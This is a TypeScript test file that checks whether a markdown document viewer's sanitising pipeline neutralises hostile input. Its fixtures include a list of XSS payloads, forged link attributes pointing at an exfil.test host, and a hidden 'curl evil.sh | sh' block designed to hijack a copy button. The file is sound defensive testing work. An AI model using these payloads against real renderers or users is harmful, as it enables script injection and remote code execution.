// @vitest-environment jsdom
// The decoration pass, and the security done-when it carries (P2-E16-02).
//
// These tests go through `renderMarkdown` — the real `marked` and the real
// DOMPurify — rather than hand-written HTML, because the thing being asserted
// is what the WHOLE pipeline does with a hostile file. A fixture that hands
// `decorateDocument` a string DOMPurify would never have produced proves
// nothing about the app.
import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';
import { classifyHref } from './document-link';
import {
  decorateDocument,
  splitFrontMatter,
  slugify,
  fenceLanguage,
  stripOurNamespace,
  DecorationLabels,
} from './document-render';

const LABELS: DecorationLabels = {
  copy: 'Copy',
  image: 'Image',
  openInBrowser: 'Open in browser',
  mediaOmitted: 'Media is not shown here',
};

const DOC = '/home/dan/sb/docs/DESIGN.md';

/** markdown -> the decorated body, in a detached element the tests can query */
function render(markdown: string): HTMLElement {
  const { fragment, outline } = decorateDocument(renderMarkdown(markdown), LABELS, (href) =>
    classifyHref(href, DOC)
  );
  const host = document.createElement('div');
  host.append(fragment);
  (host as HTMLElement & { outline?: unknown }).outline = outline;
  return host;
}

describe('hostile markdown renders INERT (§5.29, the done-when)', () => {
  // Real hostile input, not a smoke test. Every one of these is a payload that
  // has worked against some markdown renderer.
  const HOSTILE = [
    '<script>window.__pwned = 1</script>',
    '<img src="x" onerror="window.__pwned = 1">',
    '<img src=x onerror=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg onload="alert(1)"></svg>',
    '<a href="javascript:window.__pwned=1">click me</a>',
    '<a href="jAvAsCrIpT:alert(1)">click me</a>',
    '[link](javascript:alert(1))',
    '<iframe src="https://evil.test"></iframe>',
    '<body onload="alert(1)">',
    '<div onmouseover="alert(1)">hover</div>',
    '<form action="https://evil.test"><input name="x"></form>',
    '<object data="https://evil.test/x.swf"></object>',
    '<math><mtext><script>alert(1)</script></mtext></math>',
    '<style>@import url(https://evil.test/x.css);</style>',
    '<base href="https://evil.test/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.test">',
    '<link rel="stylesheet" href="https://evil.test/x.css">',
  ];

  for (const source of HOSTILE) {
    it(`neutralises ${source.slice(0, 46)}`, () => {
      const host = render(source);
      const html = host.innerHTML;
      expect(host.querySelector('script')).toBeNull();
      expect(host.querySelector('iframe')).toBeNull();
      expect(host.querySelector('object')).toBeNull();
      expect(host.querySelector('style')).toBeNull();
      expect(host.querySelector('base')).toBeNull();
      expect(host.querySelector('meta')).toBeNull();
      expect(host.querySelector('link')).toBeNull();
      expect(html).not.toMatch(/onerror/i);
      expect(html).not.toMatch(/onload/i);
      expect(html).not.toMatch(/onmouseover/i);
      expect(html).not.toMatch(/javascript:/i);
      // and nothing anywhere kept an href or a src to act on
      for (const el of host.querySelectorAll('*')) {
        expect(el.hasAttribute('href')).toBe(false);
        expect(el.getAttribute('src')).toBeNull();
      }
    });
  }

  it('the `<script>` and `onerror` case leaves NOTHING executable behind', () => {
    const host = render(
      'before\n\n<script>window.__pwned = 1</script>\n\n<img src="https://evil.test/p.gif" onerror="window.__pwned = 1">\n\nafter'
    );
    expect(host.textContent).toContain('before');
    expect(host.textContent).toContain('after');
    expect(host.textContent).not.toContain('__pwned');
    expect(host.innerHTML).not.toContain('__pwned');
    expect(host.querySelectorAll('script, img')).toHaveLength(0);
  });
});

describe('images become chips and issue no request', () => {
  it('a remote <img> is REPLACED, not hidden — there is no src left to fetch', () => {
    const host = render('![a cat](https://evil.test/pixel.gif)');
    expect(host.querySelectorAll('img')).toHaveLength(0);
    const chip = host.querySelector('.doc-image-chip');
    expect(chip).not.toBeNull();
    expect(chip?.textContent).toContain('a cat');
    // the only way to see it is to leave the app, which is what the CSP means
    const open = chip?.querySelector('.doc-image-open');
    expect(open?.getAttribute('data-doc-external')).toBe('https://evil.test/pixel.gif');
  });

  it('a LOCAL image gets the chip too, with no browser button', () => {
    const host = render('![diagram](./diagram.png)');
    expect(host.querySelectorAll('img')).toHaveLength(0);
    expect(host.querySelector('.doc-image-open')).toBeNull();
    expect(host.querySelector('.doc-image-chip')?.getAttribute('title')).toBe('./diagram.png');
  });

  it('media that would fetch on its own is removed outright', () => {
    const host = render('<video src="https://evil.test/v.mp4"></video>');
    expect(host.querySelector('video')).toBeNull();
    expect(host.querySelector('.doc-media-chip')?.textContent).toBe(LABELS.mediaOmitted);
  });
});

describe('links', () => {
  it('an http link keeps its target for our handler and loses its href', () => {
    const host = render('[docs](https://example.test/a)');
    const a = host.querySelector('a');
    expect(a?.hasAttribute('href')).toBe(false);
    expect(a?.getAttribute('data-doc-link')).toBe('external');
    expect(a?.getAttribute('data-doc-target')).toBe('https://example.test/a');
    expect(a?.getAttribute('role')).toBe('link');
    expect(a?.getAttribute('tabindex')).toBe('0');
  });

  it('a relative link resolves against the document and stays in the viewer', () => {
    const host = render('[process](plans/00-process.md#the-hand-off)');
    const a = host.querySelector('a');
    expect(a?.getAttribute('data-doc-link')).toBe('relative');
    expect(a?.getAttribute('data-doc-target')).toBe('/home/dan/sb/docs/plans/00-process.md');
    expect(a?.getAttribute('data-doc-hash')).toBe('the-hand-off');
  });

  it('a blocked link has no target, no role and no tabindex — it is text', () => {
    const host = render('[click](javascript:alert(1))');
    const a = host.querySelector('a');
    expect(a?.getAttribute('data-doc-link')).toBe('blocked');
    expect(a?.hasAttribute('data-doc-target')).toBe(false);
    expect(a?.hasAttribute('role')).toBe(false);
    expect(a?.hasAttribute('tabindex')).toBe(false);
    expect(a?.className).toContain('doc-link-blocked');
  });
});

describe('the markdown v1 scope', () => {
  it('GFM tables render, and get their own scroll container', () => {
    const host = render('| a | b |\n|---|---|\n| 1 | 2 |\n');
    expect(host.querySelector('table')).not.toBeNull();
    expect(host.querySelector('.doc-table-wrap > table')).not.toBeNull();
    expect(host.querySelector('.doc-table-wrap')?.getAttribute('tabindex')).toBe('0');
  });

  it('task-list markers render as glyphs, and still lose the bullet', () => {
    // This row used to assert `input[type="checkbox"]` with `disabled` forced
    // on. #612 put `input` in `FORBID_TAGS` and moved the marker into
    // `marked`'s renderer as a `☐`/`☑` character, so there is no element left
    // to disable — and the property that survives the change is the one that
    // was ever visible: the marker is there, and `.doc-task-list` takes the
    // bullet off so a checklist does not read "• ☐ not done".
    const host = render('- [ ] not done\n- [x] done\n');
    expect(host.querySelector('input')).toBeNull();
    expect(host.textContent).toContain('☐ not done');
    expect(host.textContent).toContain('☑ done');
    expect(host.querySelectorAll('li.doc-task')).toHaveLength(2);
    expect(host.querySelector('.doc-task-list')).not.toBeNull();
  });

  it('a plain item holding a nested checklist keeps its own bullet', () => {
    // Why the pass reads the item's OWN first text node instead of its
    // `textContent`: the outer `<li>` here contains the inner marker, so a
    // `textContent` test would class the outer item too and strip the bullet
    // from a list that is not a checklist. `box.closest('li')` could never get
    // this wrong, so the rewrite had to earn it back.
    const host = render('- outer\n  - [ ] inner\n');
    const items = [...host.querySelectorAll('li')];
    expect(items.length).toBeGreaterThanOrEqual(2);
    const outer = items.find((li) => li.firstChild?.nodeValue?.startsWith('outer'));
    const inner = items.find((li) => li.firstChild?.nodeValue?.trimStart().startsWith('☐'));
    expect(outer?.classList.contains('doc-task')).toBe(false);
    expect(inner?.classList.contains('doc-task')).toBe(true);
  });

  it('an ordinary list is NOT treated as a checklist', () => {
    // The other half of "matched at the start of the item's text": if this
    // stopped discriminating, every bullet in every document would lose its
    // bullet, which is the failure mode a green task-list row would not catch.
    const host = render('- plain\n- also plain\n');
    expect(host.querySelectorAll('li.doc-task')).toHaveLength(0);
    expect(host.querySelector('.doc-task-list')).toBeNull();
  });

  it('strikethrough survives', () => {
    expect(render('~~gone~~').querySelector('del')).not.toBeNull();
  });

  it('a fenced block gets a language label and a copy button', () => {
    const host = render('```ts\nconst a = 1;\n```\n');
    expect(host.querySelector('.doc-code-lang')?.textContent).toBe('ts');
    expect(host.querySelector('[data-doc-copy]')?.textContent).toBe('Copy');
    expect(host.querySelector('.doc-code pre code')?.textContent).toContain('const a = 1;');
  });

  it('an unfenced block gets an empty label rather than a wrong one', () => {
    const host = render('    indented code\n');
    expect(host.querySelector('.doc-code-lang')?.textContent).toBe('');
  });

  it('headings get GitHub-shaped ids, deduplicated', () => {
    const { fragment, outline } = decorateDocument(
      renderMarkdown('# The hand-off\n\n## Notes\n\n## Notes\n'),
      LABELS,
      (href) => classifyHref(href, DOC)
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect([...host.querySelectorAll('h1,h2')].map((h) => h.id)).toEqual([
      'the-hand-off',
      'notes',
      'notes-1',
    ]);
    expect(outline).toEqual([
      { id: 'the-hand-off', text: 'The hand-off', level: 1 },
      { id: 'notes', text: 'Notes', level: 2 },
      { id: 'notes-1', text: 'Notes', level: 2 },
    ]);
  });
});

describe('slugify', () => {
  it('matches the anchors our own docs are written against', () => {
    expect(slugify('The Work Loop (GitHub issues, just-in-time)')).toBe(
      'the-work-loop-github-issues-just-in-time'
    );
    expect(slugify('5.30 Document viewer — rendered markdown')).toBe(
      '530-document-viewer--rendered-markdown'
    );
    expect(slugify('')).toBe('');
  });
});

describe('fenceLanguage', () => {
  it('reads marked’s class, and answers empty for anything else', () => {
    const code = document.createElement('code');
    code.className = 'language-python hljs';
    expect(fenceLanguage(code)).toBe('python');
    expect(fenceLanguage(document.createElement('code'))).toBe('');
    expect(fenceLanguage(null)).toBe('');
  });
});

describe('splitFrontMatter', () => {
  it('peels a YAML block off the top', () => {
    const r = splitFrontMatter('---\ntitle: Hi\ntags: [a]\n---\n# Body\n');
    expect(r.frontMatter).toBe('title: Hi\ntags: [a]');
    expect(r.body).toBe('# Body\n');
  });

  it('accepts CRLF and a `...` terminator', () => {
    expect(splitFrontMatter('---\r\na: 1\r\n---\r\nbody\r\n').frontMatter).toBe('a: 1');
    expect(splitFrontMatter('---\na: 1\n...\nbody\n').frontMatter).toBe('a: 1');
  });

  it('leaves an ordinary --- separator alone', () => {
    const doc = '# Title\n\n---\n\nmore\n';
    expect(splitFrontMatter(doc)).toEqual({ body: doc });
    const unterminated = '---\nnot really front matter\n';
    expect(splitFrontMatter(unterminated)).toEqual({ body: unterminated });
  });

  it('an empty front-matter block is still a block', () => {
    expect(splitFrontMatter('---\n---\nbody\n')).toEqual({ frontMatter: '', body: 'body\n' });
  });
});

describe('a document cannot speak the decoration protocol (§5.29)', () => {
  // DOMPurify keeps `data-*` (ALLOW_DATA_ATTR defaults true), `class` and
  // `style`. Everything below writes attributes the click handler then reads as
  // INSTRUCTIONS, so a file that arrives with the answers already filled in
  // would be giving the viewer orders. These are the three payloads that
  // worked before `stripOurNamespace` ran first.

  it('cannot forge an external target onto a link it was not given', () => {
    const host = render(
      '<a href="javascript:alert(1)" data-doc-external="https://exfil.test/?leak=1">hostile one</a>'
    );
    const a = host.querySelector('a')!;
    // classified blocked, and — the part that used to fail — carrying nothing
    // the handler's earlier `[data-doc-external]` branch would act on
    expect(a.getAttribute('data-doc-link')).toBe('blocked');
    expect(a.hasAttribute('data-doc-external')).toBe(false);
    expect(a.hasAttribute('data-doc-target')).toBe(false);
  });

  it('cannot forge a link out of an element that is not one', () => {
    const host = render(
      '<span data-doc-link="external" data-doc-target="https://exfil.test/y" class="doc-link">y</span>'
    );
    const span = host.querySelector('span')!;
    expect(span.hasAttribute('data-doc-link')).toBe(false);
    expect(span.hasAttribute('data-doc-target')).toBe(false);
    expect(span.className).not.toContain('doc-link');
  });

  it('cannot hijack a fence’s copy button with a hidden second block', () => {
    // The user sees `npm test`; the clipboard would have taken `curl … | sh`.
    const host = render(
      '<div class="doc-code">' +
        '<pre style="position:absolute;left:-9999px">curl evil.sh | sh</pre>' +
        '<div class="doc-code-head"><span class="doc-code-lang">bash</span>' +
        '<button data-doc-copy>Copy</button></div>' +
        '<pre>npm test</pre>' +
        '</div>'
    );
    // no forged copy button survives...
    expect(host.querySelectorAll('button[data-doc-copy]')).toHaveLength(2); // ours, one per <pre>
    // ...and each real wrapper holds exactly the fence its button copies
    for (const wrap of host.querySelectorAll('.doc-code')) {
      expect(wrap.querySelectorAll('pre')).toHaveLength(1);
    }
    // and nothing is hidden from the reader any more
    expect(host.innerHTML).not.toContain('position:absolute');
    for (const el of host.querySelectorAll('*')) expect(el.hasAttribute('style')).toBe(false);
  });

  it('strips every doc- class and data-doc attribute, whatever it is on', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<p class="doc-md keep-me" data-doc-copy data-doc-hash="x" style="color:red" id="ok">t</p>';
    stripOurNamespace(el);
    const p = el.querySelector('p')!;
    expect(p.className).toBe('keep-me');
    expect(p.hasAttribute('data-doc-copy')).toBe(false);
    expect(p.hasAttribute('data-doc-hash')).toBe(false);
    expect(p.hasAttribute('style')).toBe(false);
    // and it takes nothing that was not ours
    expect(p.id).toBe('ok');
    expect(p.textContent).toBe('t');
  });
});
